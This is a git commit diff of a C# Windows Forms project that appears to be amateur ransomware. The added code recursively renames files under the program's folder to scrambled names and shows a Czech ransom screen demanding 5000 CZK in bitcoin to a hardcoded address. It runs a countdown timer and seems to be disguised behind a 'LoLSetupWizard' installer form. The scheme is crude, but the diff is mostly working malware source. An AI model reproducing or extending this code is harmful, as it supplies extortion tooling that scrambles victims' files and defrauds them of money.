7d060816f49edeba3bdc07ded16428da8f42c022
PervyTin <beneckym.05@spst.eu>
2022-12-10 17:23:38 +0100

    TODO: button3_Click

--- rw2/Form1.Designer.cs
+++ rw2/Form1.Designer.cs
@@ -37,13 +37,14 @@
             this.label2 = new System.Windows.Forms.Label();
             this.label3 = new System.Windows.Forms.Label();
             this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
             this.groupBox1.SuspendLayout();
             this.SuspendLayout();
             // 
             // textBox1
             // 
             this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
-            this.textBox1.Location = new System.Drawing.Point(7, 355);
+            this.textBox1.Location = new System.Drawing.Point(7, 19);
             this.textBox1.Name = "textBox1";
             this.textBox1.ReadOnly = true;
             this.textBox1.Size = new System.Drawing.Size(289, 22);
@@ -52,17 +53,20 @@
             // 
             // button1
             // 
-            this.button1.Location = new System.Drawing.Point(1186, 13);
+            this.button1.BackColor = System.Drawing.Color.White;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.button1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.button1.Location = new System.Drawing.Point(1197, 0);
             this.button1.Name = "button1";
-            this.button1.Size = new System.Drawing.Size(34, 23);
+            this.button1.Size = new System.Drawing.Size(37, 35);
             this.button1.TabIndex = 1;
-            this.button1.Text = "button1";
-            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = false;
             this.button1.Click += new System.EventHandler(this.button1_Click);
             // 
             // timer1
             // 
-            this.timer1.Interval = 1000;
+            this.timer1.Interval = 10;
             this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
             // 
             // label1
@@ -70,7 +74,7 @@
             this.label1.AutoSize = true;
             this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 48F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
             this.label1.ForeColor = System.Drawing.Color.Yellow;
-            this.label1.Location = new System.Drawing.Point(6, 520);
+            this.label1.Location = new System.Drawing.Point(6, 71);
             this.label1.Name = "label1";
             this.label1.Size = new System.Drawing.Size(153, 73);
             this.label1.TabIndex = 2;
@@ -78,11 +82,12 @@
             // 
             // groupBox1
             // 
+            this.groupBox1.Controls.Add(this.button2);
             this.groupBox1.Controls.Add(this.label1);
             this.groupBox1.Controls.Add(this.textBox1);
             this.groupBox1.Location = new System.Drawing.Point(12, 13);
             this.groupBox1.Name = "groupBox1";
-            this.groupBox1.Size = new System.Drawing.Size(302, 605);
+            this.groupBox1.Size = new System.Drawing.Size(302, 153);
             this.groupBox1.TabIndex = 3;
             this.groupBox1.TabStop = false;
             this.groupBox1.Text = "Zaplať!";
@@ -101,30 +106,43 @@
             // 
             this.label3.AutoSize = true;
             this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
-            this.label3.Location = new System.Drawing.Point(353, 170);
+            this.label3.Location = new System.Drawing.Point(351, 172);
             this.label3.Name = "label3";
-            this.label3.Size = new System.Drawing.Size(803, 99);
+            this.label3.Size = new System.Drawing.Size(774, 132);
             this.label3.TabIndex = 5;
             this.label3.Text = "Ale nemusíš se ničeho bát, všechny tvoje důležité složky\r\na soubory jsou v bezpeč" +
-    "í, na to aby si je znovu viděl\r\nmusíš poslat 5000 kč (v bitcoinu) na bitcoinovo " +
-    "adresu v levo\r\n";
+    "í, na to aby si je znovu viděl\r\nmusíš poslat 5000 kč (v bitcoinu) na bitcoinovou" +
+    " adresu na\r\n levo\r\n";
             // 
             // button2
             // 
-            this.button2.Location = new System.Drawing.Point(321, 482);
+            this.button2.BackColor = System.Drawing.SystemColors.Control;
+            this.button2.Location = new System.Drawing.Point(6, 47);
             this.button2.Name = "button2";
-            this.button2.Size = new System.Drawing.Size(240, 136);
-            this.button2.TabIndex = 6;
-            this.button2.Text = "button2";
-            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Size = new System.Drawing.Size(55, 21);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "Refresh";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.button3.Location = new System.Drawing.Point(12, 172);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(296, 132);
+            this.button3.TabIndex = 6;
+            this.button3.Text = "Zachraň mé data!";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
             // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.IndianRed;
-            this.ClientSize = new System.Drawing.Size(1232, 668);
-            this.Controls.Add(this.button2);
+            this.ClientSize = new System.Drawing.Size(1232, 344);
+            this.Controls.Add(this.button3);
             this.Controls.Add(this.label3);
             this.Controls.Add(this.label2);
             this.Controls.Add(this.groupBox1);
@@ -154,6 +172,7 @@
         private System.Windows.Forms.Label label2;
         private System.Windows.Forms.Label label3;
         private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
     }
 }
 
--- rw2/Form1.cs
+++ rw2/Form1.cs
@@ -17,15 +17,15 @@ namespace rw2
 {
     //JESTE JSEM TO NETESTOVAL A NEBUDU TO TESTOVAT DOKUD TO NEBUDU MIT VE VM, FAKT TO NETESTUJ BEZ TOHO!
     //naser si hovno B) -03.12.2022
+    //naser si hovno B) -10.12.2022
     public partial class Form1 : Form
     {
-        public int hours = 24, minutes = 0, seconds = 0;
+        public int minutes = 5, seconds = 0, milisec = 0;
         public Form1()
         {
             InitializeComponent();
         }
         string alphabet = "abcdefghijklmnopqrstuvwxyz";
-        string alphabetDecrypted = "abcdefghijklmnopqrstuvwxyz";
         string password;
         public string getRandomString(int minLength, int maxLength)
         {
@@ -61,49 +61,101 @@ namespace rw2
             }
             return vys;
         }
-        
+        /* List string name
+         * fileName.suffix - decryptedname.suffix
+         * name[i] (where i % 2 == 0), name[i+1]
+         * i+=2;
+         * 
+         * 
+         * 
+         * 
+         * 
+         * 
+         * 
+         */
+        List<string> fileNames = new List<string>();
+        List<string> filePathsBefore = new List<string>(); //C:Debug:blabla.png
+        List<string> filePathsAfter = new List<string>();  //C:Debug:albalb.cdf
         public void encrypce()
         {
             
             string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
-            string[] filePaths = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories);
-            List<string> fileNames = new List<string>();
-            List<string> decryptedSuffixes = new List<string>();
-            
-            foreach (string file in filePaths)
+            filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
+            filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
+            foreach (string file in filePathsBefore)
             {
-                
-                if (file.Contains(@"\")) //<- chytak, file bude vzdy containovat backslash, ale pro ujisteni...
+                if (file.Contains(@"\")) 
                 {
                     string newFile = file;
                     int lengthOfPrefix = file.LastIndexOf('\\');
                     newFile = newFile.Substring(lengthOfPrefix+1);
                     fileNames.Add(newFile);
+                    try 
+                    { 
+                        File.Move(file, newFile);
+                    } catch(Exception ex)
+                    {
+                        newFile = newFile + getRandomString(5, 7);
+                        File.Move(file, newFile);
+                    }
                 }
-                
             }
 
-            password = getRandomString(10, 25);
+            
             foreach (string file in fileNames)
             {
-                //File.Move(file, getCryptedString(password, file));
+                string password = getRandomString(20, 25);
+                string cryptedFilePosition = getCryptedString(password, file);
+                try
+                {
+                    File.Move(file, cryptedFilePosition);
+                } catch(Exception ex)
+                {
+                    password = getRandomString(20, 25);
+                    cryptedFilePosition = cryptedFilePosition = getCryptedString(password, file);
+                    File.Move(file, cryptedFilePosition);
+                }
+                filePathsAfter.Add(cryptedFilePosition);
             }
-
-
+        }
+        public bool isCodeCorrect(string code)
+        { //A--------------------
+            if (code.Length != 15)  return false;
+            if (code[0] != 'A')     return false;
+            return true;
         }
         public void dekrypce()
-        {
-            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
-            filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
-            string fileEnd = string.Empty;
-            string[] filePaths = Directory.GetFiles(filePath, "*.txt");
-
+        {   //C:Debug:blabla.png
+            //C:Debug:albalb.cdf
+            for(int i = 0; i!= filePathsAfter.Count;i++)
+            {
+                File.Move(filePathsAfter[i], filePathsBefore[i]);
+            }
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
-            Application.Exit();
+            LoLSetupWizard.Form2 f2 = new LoLSetupWizard.Form2();
+            f2.Show();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            textBox1.Text = "1FfmbHfnpaZjKFvyi1okTjJJusN455paPH";
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            DialogResult dr = MessageBox.Show("Doopravdy jste poslali peníze na zadanou adresu?", "Odpovězte popravdě!", MessageBoxButtons.YesNo);
+            if(dr == DialogResult.Yes)
+            {
+                dekrypce();
+            } else
+            {
+                button3.Visible = false;
+            }
+            
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -114,23 +166,24 @@ namespace rw2
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-            seconds--;
-            if(seconds < 0)
+            milisec--;
+            if(milisec < 0)
             {
-                minutes--;
-                seconds = 59;
-                if(minutes < 0)
+                seconds--;
+                milisec = 99;
+                if(seconds < 0)
                 {
-                    hours--;
-                    minutes = 59;
-                    if(hours == 0)
+                    minutes--;
+                    seconds = 59;
+                    if(minutes == 0)
                     {
                         timer1.Enabled = false;
-                        label1.Text = "Čas vypršel!";
+                        MessageBox.Show("Bye Bye! :-D");
+                        Application.Exit();
                     }
                 }
             }
-            label1.Text = hours.ToString() + ":" + minutes.ToString() + ":" + seconds.ToString();
+            label1.Text = minutes.ToString() + ":" + seconds.ToString()+":"+milisec.ToString("D2");
         }
     }
 }
